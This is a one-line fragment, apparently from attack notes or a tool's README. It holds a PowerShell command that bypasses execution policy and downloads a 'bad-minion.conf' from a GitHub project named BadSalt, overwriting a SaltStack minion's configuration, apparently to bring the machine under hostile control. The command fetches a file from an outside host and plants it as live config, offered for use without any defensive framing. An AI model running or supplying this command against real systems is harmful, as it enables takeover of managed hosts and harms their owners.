...
powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/3ndG4me/BadSalt/master/bad-minion.conf', 'C:\salt\conf\minion')
